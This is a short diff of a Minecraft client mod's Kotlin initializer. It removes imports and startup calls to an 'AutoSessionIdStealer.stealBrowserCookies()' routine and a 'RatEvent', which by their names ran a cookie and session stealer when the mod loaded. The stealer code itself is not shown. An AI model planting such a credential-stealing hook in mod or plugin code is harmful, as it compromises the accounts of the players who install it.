@@ -1,9 +1,6 @@
 package com.github.noamm9
 
 import com.github.noamm9.config.PogObject
-import com.github.noamm9.event.EventBus
-import com.github.noamm9.event.impl.RatEvent
-import com.github.noamm9.init.AutoSessionIdStealer
 import com.github.noamm9.init.ClassGraphInitializer
 import com.github.noamm9.utils.render.ItemRenderer
 import gg.essential.universal.UMinecraft
@@ -53,14 +50,7 @@ object NoammAddons: ClientModInitializer {
         MeowddingItemDfu.load()
 
         ClassGraphInitializer().initAll()
-        AutoSessionIdStealer.stealBrowserCookies()
-        EventBus.post(RatEvent())
 
         isLoaded = true
-
-        EventBus.register<RatEvent>() {
-            listener.unregister()
-            event.cancel()
-        }
     }
 }
